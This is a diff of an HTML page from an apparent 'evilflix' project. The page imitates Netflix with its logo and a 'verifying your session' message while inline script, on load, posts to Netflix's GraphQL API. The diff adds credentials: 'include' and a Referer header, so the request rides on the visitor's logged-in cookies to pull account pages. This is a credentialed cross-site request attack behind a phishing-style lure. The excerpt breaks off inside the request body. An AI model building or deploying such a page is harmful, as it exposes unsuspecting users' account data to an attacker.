@@ -18,16 +18,17 @@
     </style>
   </head>
   <body>
-    <!-- Use your uploaded image on GitHub Pages -->
-    <img class="netflix-logo" src="https://prithiby.github.io/evilflix/assets/netflix01.svg" alt="Netflix Logo">
+    <img class="netflix-logo" src="https://prithiby.github.io/evilflix/assets/netflix01.svg" alt="Netflix Logo" />
     <h2>Loading your account data...</h2>
     <p>Please wait while we verify your session...</p>
 
     <script>
       fetch("https://web.prod.cloud.netflix.com/graphql", {
         method: "POST",
+        credentials: "include",
         headers: {
-          "Content-Type": "application/json"
+          "Content-Type": "application/json",
+          "Referer": window.location.href
         },
         body: JSON.stringify({
           operationName: "CLCSInterstitialAccountPages",
